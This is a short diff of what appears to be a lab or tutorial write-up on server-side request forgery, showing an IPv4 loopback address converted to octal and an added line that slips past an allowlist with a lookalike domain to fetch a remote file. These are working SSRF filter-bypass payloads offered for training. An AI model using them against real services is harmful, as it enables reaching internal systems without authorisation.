@@ -19,5 +19,8 @@ To do convert an IPv4 address like 127.0.0.1 into a single-integer octal equival
 127.0.0.1 &#x3C;convert> 017700000001
 
 libcurl.me/?url=http://017700000001:1234/
+
+# the developer blocked everything that doesn't match
+libcurl.me/?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/hacker.txt
 </code></pre>
 
